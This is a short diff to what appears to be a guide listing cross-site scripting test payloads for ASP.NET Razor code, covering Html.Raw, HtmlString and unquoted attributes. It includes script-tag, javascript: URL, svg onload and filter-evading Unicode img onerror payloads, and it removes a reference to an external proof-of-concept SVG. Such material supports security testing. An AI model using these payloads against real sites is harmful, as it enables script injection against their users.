@@ -76,7 +76,7 @@ Code example: @Html.Raw(Model.Name)
 <script>alert('XSS attack');</script>
 ```
 - Query to exploit HtmlString vulnerability:
-Code example: @HtmlString("<img src='" + imageUrl + "'>")
+Code example: @HtmlString("<img src='" + image + "'>")
 ```
 <img src="javascript:alert('XSS attack')">
 ```
@@ -91,8 +91,7 @@ If the code includes an API endpoint that returns an SVG image and/or other cont
 <svg onload=alert('XSS attack')>
 ```
 Query to exploit attribute value without quotes vulnerability:
-var @imageUrl = http://brutelogic.com.br/poc.svg
-<img src=\\@imageUrl>
+<img src=@image>
 ```
 <𝚒𝚖𝚐 𝚜𝚛𝚌=𝚡 𝚘𝚗𝚎𝚛𝚛𝚘𝚛=𝚙𝚛𝚒𝚗𝚝()>
 ```
